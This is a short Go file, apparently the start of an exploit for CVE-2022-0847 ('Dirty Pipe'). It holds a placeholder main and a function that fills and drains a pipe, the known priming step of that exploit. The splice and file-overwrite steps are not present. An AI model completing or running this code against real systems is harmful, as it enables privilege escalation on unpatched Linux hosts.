package CVE_2022_0847

import (
	"fmt"
	"golang.org/x/sys/unix"
	"os"
	"syscall"
)

const PageSize = 4096

func main() {
	fmt.Println("Hello world")
}

func initPipe() (*os.File, error) {
	r, w, err := os.Pipe()
	if err != nil {
		return nil, fmt.Errorf("pipe error: %w", err)
	}

	pipeSize, err := unix.FcntlInt(w.Fd(), syscall.F_GETPIPE_SZ, -1)
	if err != nil {
		return nil, fmt.Errorf("fcntl error: %w", err)
	}

	buf := [PageSize]byte{}
	for i := 0; i < pipeSize/PageSize; i++ {
		if _, err = w.Write(buf[:]); err != nil {
			return nil, fmt.Errorf("pipe write error: %w", err)
		}
	}

	for i := 0; i < pipeSize/PageSize; i++ {
		if _, err = r.Read(buf[:]); err != nil {
			return nil, fmt.Errorf("pipe read error: %w", err)
		}
	}

	return w, nil
}
